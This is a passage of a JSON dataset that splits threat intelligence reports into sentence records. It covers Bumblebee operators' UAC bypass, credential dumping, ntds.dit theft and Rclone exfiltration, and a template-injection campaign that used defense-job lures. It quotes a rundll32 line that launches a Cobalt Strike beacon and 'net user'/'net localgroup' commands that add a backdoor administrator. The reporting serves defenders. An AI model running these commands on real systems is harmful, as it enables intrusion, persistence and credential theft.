        "text": "Bumblebee performs privilege escalation by loading an exploit for CVE-2020-1472 (Zerologon) into rundll32.exe:\n",
        "type": "",
        "report": "r-1177",
        "line": 18,
        "index": 3316
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S19",
        "text": "Bumblebee uses a User Account Control (UAC) bypass technique to deploy post exploitation tools with elevated privileges on infected machines.",
        "type": "",
        "report": "r-1177",
        "line": 19,
        "index": 3317
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S20",
        "text": "The method uses fodhelper.exe which is a trusted binary, meaning Windows 10 won't show a UAC window when launched into execution:\n",
        "type": "",
        "report": "r-1177",
        "line": 20,
        "index": 3318
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S21",
        "text": "Fodhelper.exe is used to run \"cmd.exe\" /c rundll32.exe C:\\ProgramData\\Cisco\\[Cobalt strike].dll\u201d,MainProc where [Cobalt strike].dll is a Cobalt Strike framework beacon and MainProc is the exported function to run.",
        "type": "",
        "report": "r-1177",
        "line": 21,
        "index": 3319
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S22",
        "text": "Cobalt Strike is an adversary simulation framework with the primary use case of assisting red team operations.",
        "type": "",
        "report": "r-1177",
        "line": 22,
        "index": 3320
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S23",
        "text": "However, Cobalt Strike is also actively used by malicious actors for conducting post-intrusion malicious activities.",
        "type": "",
        "report": "r-1177",
        "line": 23,
        "index": 3321
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S24",
        "text": "Cobalt Strike is a modular framework with an extensive set of features that are useful to malicious actors, such as command execution, process injection, and credential theft.",
        "type": "",
        "report": "r-1177",
        "line": 24,
        "index": 3322
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S25",
        "text": "After obtaining system privileges on the infected machine, Bumblebee performs credential theft using two methods detailed below.\n",
        "type": "",
        "report": "r-1177",
        "line": 25,
        "index": 3323
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S26",
        "text": "First method used is Local Security Authority Subsystem Service (LSASS) process memory dump.",
        "type": "",
        "report": "r-1177",
        "line": 26,
        "index": 3324
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S27",
        "text": "On Windows systems domain, local usernames and passwords are stored in the memory space of the LSASS process.",
        "type": "",
        "report": "r-1177",
        "line": 27,
        "index": 3325
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S28",
        "text": "Bumblebee dumps the memory of this process using procdump64.exe to access the sensitive information:\n",
        "type": "",
        "report": "r-1177",
        "line": 28,
        "index": 3326
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S29",
        "text": "The second method of credential theft that Bumblebee operators use is registry hive extraction using reg.exe:\n",
        "type": "",
        "report": "r-1177",
        "line": 29,
        "index": 3327
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S30",
        "text": "- HKLM SAM:",
        "type": "",
        "report": "r-1177",
        "line": 30,
        "index": 3328
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S31",
        "text": "The Security Account Manager (SAM) database is where Windows stores information about user accounts.",
        "type": "",
        "report": "r-1177",
        "line": 31,
        "index": 3329
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S32",
        "text": "- HKLM Security: Local Security Authority (LSA) stores user logins and their LSA secrets.",
        "type": "",
        "report": "r-1177",
        "line": 32,
        "index": 3330
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S33",
        "text": "- HKLM System: Contains keys that could be used to decrypt/encrypt the LSA secret and SAM database:\n",
        "type": "",
        "report": "r-1177",
        "line": 33,
        "index": 3331
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S34",
        "text": "Bumblebee operators :\n",
        "type": "",
        "report": "r-1177",
        "line": 34,
        "index": 3332
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S35",
        "text": "- Obtain registry dumps\n",
        "type": "",
        "report": "r-1177",
        "line": 35,
        "index": 3333
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S36",
        "text": "- Compress the data\n",
        "type": "",
        "report": "r-1177",
        "line": 36,
        "index": 3334
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S37",
        "text": "- Exfiltrate it over their network tunnel:\n",
        "type": "",
        "report": "r-1177",
        "line": 37,
        "index": 3335
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S38",
        "text": "Bumblebee operators process retrieved credentials offline, attempting to extract cleartext passwords.",
        "type": "",
        "report": "r-1177",
        "line": 38,
        "index": 3336
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S39",
        "text": "The time between credentials theft and the next activity is approximately 3 hours.\n",
        "type": "",
        "report": "r-1177",
        "line": 39,
        "index": 3337
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S40",
        "text": "After the attackers gain a foothold in the organization network, they gather information in various ways.",
        "type": "",
        "report": "r-1177",
        "line": 40,
        "index": 3338
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S41",
        "text": "We have observed attackers using tools such as nltest, ping, netview, tasklist and Adfind to collect wide information related to the organization.",
        "type": "",
        "report": "r-1177",
        "line": 41,
        "index": 3339
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S42",
        "text": "The attackers collect information such as the domain names, users, hosts and domain controllers.",
        "type": "",
        "report": "r-1177",
        "line": 42,
        "index": 3340
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S43",
        "text": "AdFind (named \u201caf.exe\u201d) is a publicly available tool for querying Active Directory and has been used by multiple threat actors:\n",
        "type": "",
        "report": "r-1177",
        "line": 43,
        "index": 3341
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S44",
        "text": "During the reconnaissance phase, Bumblebee operators contacted more than 200 IP addresses and domain names within the organization.",
        "type": "",
        "report": "r-1177",
        "line": 44,
        "index": 3342
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S45",
        "text": "The most notable ones are Microsoft Exchange, Windows Server Update Services (WSUS) servers.\n",
        "type": "",
        "report": "r-1177",
        "line": 45,
        "index": 3343
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S46",
        "text": "The following table summarizes the reconnaissance commands observed by Cybereason GSOC analysts:\n",
        "type": "",
        "report": "r-1177",
        "line": 46,
        "index": 3344
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S47",
        "text": "Bumblebee uses a Cobalt Strike agent for lateral movement.",
        "type": "",
        "report": "r-1177",
        "line": 47,
        "index": 3345
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S48",
        "text": "We can see multiple connections from the process to internal addresses on Remote Desktop Protocol (RDP), on TCP port 3389:\n",
        "type": "",
        "report": "r-1177",
        "line": 48,
        "index": 3346
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S49",
        "text": "Following the lateral movement, the attacker persists on the organization network using the remote management software \u201cany desk\u201d:\n",
        "type": "",
        "report": "r-1177",
        "line": 49,
        "index": 3347
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S50",
        "text": "Bumblebee operators using Anydesk for lateral movement as seen in the Cybereason Defense Platform\n",
        "type": "",
        "report": "r-1177",
        "line": 50,
        "index": 3348
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S51",
        "text": "After the attacker obtains a highly privileged user and its password, the attacker accesses the shadow copy.",
        "type": "",
        "report": "r-1177",
        "line": 51,
        "index": 3349
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S52",
        "text": "Shadow Copy is a technology included in Microsoft Windows that can create backup copies or snapshots of computer files or volumes.",
        "type": "",
        "report": "r-1177",
        "line": 52,
        "index": 3350
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S53",
        "text": "Bumblebee accesses the remote Active Directory machines using Windows Management Instrumentation command-line utility (WMIC) and creates a shadow copy using vssadmin command.",
        "type": "",
        "report": "r-1177",
        "line": 53,
        "index": 3351
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S54",
        "text": "In addition, the attacker steals the ntds.dit file from the domain controller.",
        "type": "",
        "report": "r-1177",
        "line": 54,
        "index": 3352
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S55",
        "text": "The ntds.dit file is a database that stores Active Directory data, including information about user objects, groups and group membership.",
        "type": "",
        "report": "r-1177",
        "line": 55,
        "index": 3353
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S56",
        "text": "The file also stores the password hashes for all users in the domain:\n",
        "type": "",
        "report": "r-1177",
        "line": 56,
        "index": 3354
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S57",
        "text": "The following are the commands related to credential theft used to escalate privileges on the Active Directory:\n",
        "type": "",
        "report": "r-1177",
        "line": 57,
        "index": 3355
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S58",
        "text": "In order to obtain maximum privileges on the Active Directory domain, the threat actor:\n",
        "type": "",
        "report": "r-1177",
        "line": 58,
        "index": 3356
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S59",
        "text": "- Creates a shadow copy of the machine file\u2019s volume\n",
        "type": "",
        "report": "r-1177",
        "line": 59,
        "index": 3357
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S60",
        "text": "- Lists all available shadow copies and stored the result in a file.\n",
        "type": "",
        "report": "r-1177",
        "line": 60,
        "index": 3358
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S61",
        "text": "- Copies the Active Directory database (ntds.dit) as well as registry hives containing credentials and sensitive data from the shadow copy.\n",
        "type": "",
        "report": "r-1177",
        "line": 61,
        "index": 3359
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S62",
        "text": "- Compress the output directory for exfiltration.\n",
        "type": "",
        "report": "r-1177",
        "line": 62,
        "index": 3360
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S63",
        "text": "The threat actor uses a domain administrator account obtained previously to move laterally on multiple systems.",
        "type": "",
        "report": "r-1177",
        "line": 63,
        "index": 3361
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S64",
        "text": "After initial connection, they create a local user and exfiltrate data using Rclone software.\n",
        "type": "",
        "report": "r-1177",
        "line": 64,
        "index": 3362
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S65",
        "text": "User creation commands are as follows :\n",
        "type": "",
        "report": "r-1177",
        "line": 65,
        "index": 3363
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S66",
        "text": "- net user [Attacker created username] P@ssw0rd!1 /add\n",
        "type": "",
        "report": "r-1177",
        "line": 66,
        "index": 3364
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S67",
        "text": "- net localgroup Administrators [Attacker created username] /add\n",
        "type": "",
        "report": "r-1177",
        "line": 67,
        "index": 3365
    },
    {
        "id": "cti_reports_filtered/r-1177.md:::S68",
        "text": "The rclone.exe process transfers approximately 50 GB of data to an endpoint with an IP address over TCP port 22 (SSH), which is located in the United States.",
        "type": "",
        "report": "r-1177",
        "line": 68,
        "index": 3366
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S0",
        "text": "This recent campaign used malicious documents to install malware on the targeted system using a template injection attack.",
        "type": "",
        "report": "r-1274",
        "line": 0,
        "index": 3367
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S1",
        "text": "This technique allows a weaponized document to download an external Word template containing macros that will be executed.",
        "type": "",
        "report": "r-1274",
        "line": 1,
        "index": 3368
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S2",
        "text": "This is a known trick used to bypass static malicious document analysis, as well as detection, as the macros are embedded in the downloaded template.\n",
        "type": "",
        "report": "r-1274",
        "line": 2,
        "index": 3369
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S3",
        "text": "Further, these malicious Word documents contained content related to legitimate jobs at these leading defense contractors.",
        "type": "",
        "report": "r-1274",
        "line": 3,
        "index": 3370
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S4",
        "text": "All three organizations have active defense contracts of varying size and scope with the US government.\n",
        "type": "",
        "report": "r-1274",
        "line": 4,
        "index": 3371
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S5",
        "text": "The timeline for these documents, that were sent to an unknown number of targets, ran between 31 March and 18 May 2020.\n",
        "type": "",
        "report": "r-1274",
        "line": 5,
        "index": 3372
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S6",
        "text": "Malign documents were the main entry point for introducing malicious code into the victim\u2019s environment.",
        "type": "",
        "report": "r-1274",
        "line": 6,
        "index": 3373
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S7",
        "text": "These documents contained job descriptions from defense, aerospace and other sectors as a lure.",
        "type": "",
        "report": "r-1274",
        "line": 7,
        "index": 3374
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S8",
        "text": "The objective would be to send these documents to a victim\u2019s email with the intention they open, view and ultimately execute the payload.",
        "type": "",
        "report": "r-1274",
        "line": 8,
        "index": 3375
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S9",
        "text": "As we mentioned, the adversary used a technique called template injection.",
        "type": "",
        "report": "r-1274",
        "line": 9,
        "index": 3376
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S10",
        "text": "When a document contains the .docx extension, in our case, it means that we are dealing with the Open Office XML standard.",
        "type": "",
        "report": "r-1274",
        "line": 10,
        "index": 3377
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S11",
        "text": "A .docx file is a zip file containing multiple parts.",
        "type": "",
        "report": "r-1274",
        "line": 11,
        "index": 3378
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S12",
        "text": "Using the template injection technique, the adversary puts a link towards the template file in one of the .XML files, for example the link is in settings.xml.rels while the external oleobject load is in document.xml.rels.",
        "type": "",
        "report": "r-1274",
        "line": 12,
        "index": 3379
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S13",
        "text": "The link will load a template file (DOTM) from a remote server.",
        "type": "",
        "report": "r-1274",
        "line": 13,
        "index": 3380
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S14",
        "text": "This is a clever technique we observe being used by multiple adversaries [5] and is intended to make a document appear to be clean initially, only to subsequently load malware.",
        "type": "",
        "report": "r-1274",
        "line": 14,
        "index": 3381
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S15",
        "text": "Some of these template files are renamed as JPEG files when hosted on a remote server to avoid any suspicion and bypass detection.",
        "type": "",
        "report": "r-1274",
        "line": 15,
        "index": 3382
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S16",
        "text": "These template files contain Visual Basic macro code, that will load a DLL implant onto the victim\u2019s system.",
        "type": "",
        "report": "r-1274",
        "line": 16,
        "index": 3383
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S17",
        "text": "Current McAfee technologies currently protect against this threat.",
        "type": "",
        "report": "r-1274",
        "line": 17,
        "index": 3384
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S18",
        "text": "We mentioned earlier that docx files (like xlsx and pptx) are part of the OOXML standard.",
        "type": "",
        "report": "r-1274",
        "line": 18,
        "index": 3385
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S19",
        "text": "The document defining this standard[6], describes the syntax and values that can be used as an example.",
        "type": "",
        "report": "r-1274",
        "line": 19,
        "index": 3386
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S20",
        "text": "An interesting file to look at is the \u2018settings.xml\u2019 file that can be discovered in the \u2018Word\u2019 container of the docx zip file.",
        "type": "",
        "report": "r-1274",
        "line": 20,
        "index": 3387
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S21",
        "text": "This file contains settings with regards to language, markup and more.",
        "type": "",
        "report": "r-1274",
        "line": 21,
        "index": 3388
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S22",
        "text": "First, we extracted all the data from the settings.xml files and started to compare.",
        "type": "",
        "report": "r-1274",
        "line": 22,
        "index": 3389
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S23",
        "text": "All the documents below contained the same language values:\n",
        "type": "",
        "report": "r-1274",
        "line": 23,
        "index": 3390
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S24",
        "text": "The XML file ends with a GUID value that starts with the value \u201cw15\u201d.\n",
        "type": "",
        "report": "r-1274",
        "line": 24,
        "index": 3391
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S25",
        "text": "According to the Microsoft documentation, w15 defines the PersistentDocumentId Class.",
        "type": "",
        "report": "r-1274",
        "line": 25,
        "index": 3392
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S26",
        "text": "When the object is serialized out as xml, its qualified name is w15:docId.",
        "type": "",
        "report": "r-1274",
        "line": 26,
        "index": 3393
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S27",
        "text": "The 128-bit GUID is set as an ST_Guid attribute which, according to the Microsoft documentation, refers to a unique token.",
        "type": "",
        "report": "r-1274",
        "line": 27,
        "index": 3394
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S28",
        "text": "The used class generates a GUID for use as the DocID and generates the associated key.",
        "type": "",
        "report": "r-1274",
        "line": 28,
        "index": 3395
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S29",
        "text": "The client stores the GUID in that structure and persists in the doc file.",
        "type": "",
        "report": "r-1274",
        "line": 29,
        "index": 3396
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S30",
        "text": "If, for example, we would create a document and would \u201cSave As\u201d, the w15:docId GUID would persist across to the newly created document.",
        "type": "",
        "report": "r-1274",
        "line": 30,
        "index": 3397
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S31",
        "text": "What would that mean for our list above?",
        "type": "",
        "report": "r-1274",
        "line": 31,
        "index": 3398
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S32",
        "text": "Documents with the same GUID value need to be placed in chronological order and then we can state the earliest document is the root for the rest, for example:\n",
        "type": "",
        "report": "r-1274",
        "line": 32,
        "index": 3399
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S33",
        "text": "What we can say from above table is that \u2018_IFG_536R.docx\u201d was the first document we observed and that later documents with the same docID value were created from the same base document.",
        "type": "",
        "report": "r-1274",
        "line": 33,
        "index": 3400
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S34",
        "text": "To add to this assertion; in the settings.xml file the value \u201crsid\u201d (Revision Identifier for Style Definition) can be found.",
        "type": "",
        "report": "r-1274",
        "line": 34,
        "index": 3401
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S35",
        "text": "According to Microsoft\u2019s documentation: \u201cThis element specifies a unique four-digit number which shall be used to determine the editing session in which this style definition was last modified.",
        "type": "",
        "report": "r-1274",
        "line": 35,
        "index": 3402
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S36",
        "text": "This value shall follow this following constraint: All document elements which specify the same rsid* values shall correspond to changes made during the same editing session.",
        "type": "",
        "report": "r-1274",
        "line": 36,
        "index": 3403
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S37",
        "text": "An editing session is defined as the period of editing which takes place between any two subsequent save actions.\u201d\n",
        "type": "",
        "report": "r-1274",
        "line": 37,
        "index": 3404
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S38",
        "text": "Let\u2019s start with the rsid element values from \u201c*_IFG_536R.docx\u201d:\n",
        "type": "",
        "report": "r-1274",
        "line": 38,
        "index": 3405
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S39",
        "text": "And compare with the rsid element values from \u201c*_PMS.docx\u201d:\n",
        "type": "",
        "report": "r-1274",
        "line": 39,
        "index": 3406
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S40",
        "text": "The rsid elements are identical for the first four editing sessions for both documents.",
        "type": "",
        "report": "r-1274",
        "line": 40,
        "index": 3407
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S41",
        "text": "This indicates that these documents, although they are now separate, originated from the same document.",
        "type": "",
        "report": "r-1274",
        "line": 41,
        "index": 3408
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S42",
        "text": "Digging into more values and metadata (we are aware they can be manipulated), we created the following overview in chronological order based on the creation date:\n",
        "type": "",
        "report": "r-1274",
        "line": 42,
        "index": 3409
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S43",
        "text": "When we zoom in on the DocID \u201c932E534d(..) we read the value of a template file in the XML code: \u201cSingle spaced (blank).dotx\u201d \u2013 this template name seems to be used by multiple \u201cAuthor\u201d names.",
        "type": "",
        "report": "r-1274",
        "line": 43,
        "index": 3410
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S44",
        "text": "The revision number indicates the possible changes in the document.",
        "type": "",
        "report": "r-1274",
        "line": 44,
        "index": 3411
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S45",
        "text": "Note: the documents in the table with \u201cNo DocID\u201d were the \u201cdotm\u201d files containing the macros/payload.\n",
        "type": "",
        "report": "r-1274",
        "line": 45,
        "index": 3412
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S46",
        "text": "All files were created with Word 2016 and had both the English and Korean languages installed.",
        "type": "",
        "report": "r-1274",
        "line": 46,
        "index": 3413
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S47",
        "text": "This analysis into the metadata indicates that there is a high confidence that the malicious documents were created from a common root document.\n",
        "type": "",
        "report": "r-1274",
        "line": 47,
        "index": 3414
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S48",
        "text": "There were several documents flagged as non-malicious discovered during our investigation.",
        "type": "",
        "report": "r-1274",
        "line": 48,
        "index": 3415
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S49",
        "text": "At first glance they did not seem important or related at all, but deeper investigation revealed how they were connected.",
        "type": "",
        "report": "r-1274",
        "line": 49,
        "index": 3416
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S50",
        "text": "These documents played a role in building the final malicious documents that ultimately got sent to the victims.",
        "type": "",
        "report": "r-1274",
        "line": 50,
        "index": 3417
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S51",
        "text": "Further analysis of these documents, based on metadata information, indicated that they contained relationships to the primary documents created by the adversary.\n",
        "type": "",
        "report": "r-1274",
        "line": 51,
        "index": 3418
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S52",
        "text": "Two PDF files (***_SPE_LEOS and ***_HPC_SE) with aerospace & defense industry themed images, created via the Microsoft Print to PDF service, were submitted along with ***_ECS_EPM.docx.",
        "type": "",
        "report": "r-1274",
        "line": 52,
        "index": 3419
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S53",
        "text": "The naming convention of these PDF files was very similar to the malicious documents used.",
        "type": "",
        "report": "r-1274",
        "line": 53,
        "index": 3420
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S54",
        "text": "The name includes abbreviations for positions at the defense contractor much like the malicious documents.",
        "type": "",
        "report": "r-1274",
        "line": 54,
        "index": 3421
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S55",
        "text": "The Microsoft Print to PDF service enables content from a Microsoft Word document be printed to PDF directly.",
        "type": "",
        "report": "r-1274",
        "line": 55,
        "index": 3422
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S56",
        "text": "In this case these two PDF files were generated from an original Microsoft Word document with the author \u2018HOME\u2019.",
        "type": "",
        "report": "r-1274",
        "line": 56,
        "index": 3423
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S57",
        "text": "The author \u2018HOME\u2019 appeared in multiple malicious documents containing job descriptions related to aerospace, defense and the entertainment industry.",
        "type": "",
        "report": "r-1274",
        "line": 57,
        "index": 3424
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S58",
        "text": "The PDFs were discovered in an archive file indicating that LinkedIn may have been a possible vector utilized by the adversaries to target victims.",
        "type": "",
        "report": "r-1274",
        "line": 58,
        "index": 3425
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S59",
        "text": "This is a similar vector as to what has been observed in a campaign reported by industry[7], however as mentioned earlier the research covered in this blog is part of a different activity set.",
        "type": "",
        "report": "r-1274",
        "line": 59,
        "index": 3426
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S60",
        "text": "Digging into the remote template files reveals some additional insight concerning the structure of the macro code.",
        "type": "",
        "report": "r-1274",
        "line": 60,
        "index": 3427
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S61",
        "text": "The second stage remote document template files contain Visual Basic macro code designed to extract a double base64 encoded DLL implant.",
        "type": "",
        "report": "r-1274",
        "line": 61,
        "index": 3428
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S62",
        "text": "The content is all encoded in UserForm1 in the remote DOTM file that is extracted by the macro code.",
        "type": "",
        "report": "r-1274",
        "line": 62,
        "index": 3429
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S63",
        "text": "Further, the code will also extract the embedded decoy document (a clean document containing the job description) to display to the victim.",
        "type": "",
        "report": "r-1274",
        "line": 63,
        "index": 3430
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S64",
        "text": "The adversary used malicious DLL files, delivered through stage 2 malicious documents, to spy on targets.",
        "type": "",
        "report": "r-1274",
        "line": 64,
        "index": 3431
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S65",
        "text": "Those malicious documents were designed to drop DLL implants on the victim\u2019s machine to collect initial intelligence.",
        "type": "",
        "report": "r-1274",
        "line": 65,
        "index": 3432
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S66",
        "text": "In this campaign the adversary was utilizing patched SQL Lite DLLs to gather basic information from its targets.",
        "type": "",
        "report": "r-1274",
        "line": 66,
        "index": 3433
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S67",
        "text": "These DLLs were modified to include malicious code to be executed on the victim\u2019s machine when they\u2019re invoked under certain circumstances.",
        "type": "",
        "report": "r-1274",
        "line": 67,
        "index": 3434
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S68",
        "text": "The purpose of these DLLs is/was to gather machine information from infected victims that could be used to further identify more interesting targets.",
        "type": "",
        "report": "r-1274",
        "line": 68,
        "index": 3435
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S69",
        "text": "The first stage document sent to targeted victims contained an embedded link that downloaded the remote document template.",
        "type": "",
        "report": "r-1274",
        "line": 69,
        "index": 3436
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S70",
        "text": "The DOTM (Office template filetype) files are responsible for loading the patched DLLs onto the victim\u2019s machine to collect and gather data.",
        "type": "",
        "report": "r-1274",
        "line": 70,
        "index": 3437
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S71",
        "text": "These DOTM files are created with DLL files encoded directly into the structure of the file.",
        "type": "",
        "report": "r-1274",
        "line": 71,
        "index": 3438
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S72",
        "text": "These DOTM files exist on remote servers compromised by the adversary; the first stage document contains an embedded link that refers to the location of this file.",
        "type": "",
        "report": "r-1274",
        "line": 72,
        "index": 3439
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S73",
        "text": "When the victim opens the document, the remote DOTM file that contains a Visual Basic macro code to load malicious DLLs, is loaded.",
        "type": "",
        "report": "r-1274",
        "line": 73,
        "index": 3440
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S74",
        "text": "Based on our analysis, these DLLs were first seen on 20 April 2020 and, to our knowledge based on age and prevalence data, these implants have been customized for this attack.\n",
        "type": "",
        "report": "r-1274",
        "line": 74,
        "index": 3441
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S75",
        "text": "The workflow of the attack can be represented by the following image:\n",
        "type": "",
        "report": "r-1274",
        "line": 75,
        "index": 3442
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S76",
        "text": "To identify the malicious DLLs that will load or download the final implant, we extracted from the Office files found in the triage phase, the following DLL files:\n",
        "type": "",
        "report": "r-1274",
        "line": 76,
        "index": 3443
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S77",
        "text": "These DLL files are patched versions from goodware libraries, like the SQLITE library found in our analysis, and are loaded via a VBScript contained within the DOTM files that loads a double Base64 encoded DLL as described in this analysis.",
        "type": "",
        "report": "r-1274",
        "line": 77,
        "index": 3444
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S78",
        "text": "The DLL is encoded in UserForm1 (contained within the Microsoft Word macro) and the primary macro code is responsible for extracting and decoded the DLL implant.\n",
        "type": "",
        "report": "r-1274",
        "line": 78,
        "index": 3445
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S79",
        "text": "From our analysis, we could verify how the DLLs used in the third stage were legitimate software with a malicious implant inside that would be enabled every time a specific function was called with a set of parameters.",
        "type": "",
        "report": "r-1274",
        "line": 79,
        "index": 3446
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S80",
        "text": "Analyzing the sample statically, it was possible to extract the legitimate software used to store the implant, for example, one of the DLL files extracted from the DOTM files was a patched SQLITE library.",
        "type": "",
        "report": "r-1274",
        "line": 80,
        "index": 3447
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S81",
        "text": "If we compare the original library within the extracted DLL, we can spot lot of similarities across the two samples:\n",
        "type": "",
        "report": "r-1274",
        "line": 81,
        "index": 3448
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S82",
        "text": "As mentioned, the patched DLL and the original SQLITE library share a lot of code:\n",
        "type": "",
        "report": "r-1274",
        "line": 82,
        "index": 3449
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S83",
        "text": "The first DLL stage needs certain parameters in order to be enabled and launched in the system.",
        "type": "",
        "report": "r-1274",
        "line": 83,
        "index": 3450
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S84",
        "text": "The macro code of the Office files we analyzed, contained part of these parameters:\n",
        "type": "",
        "report": "r-1274",
        "line": 84,
        "index": 3451
    },
    {
        "id": "cti_reports_filtered/r-1274.md:::S85",
        "text": "The data found in the VBA macro had the following details:\n",
        "type": "",
        "report": "r-1274",
        "line": 85,
        "index": 3452
    },
    {
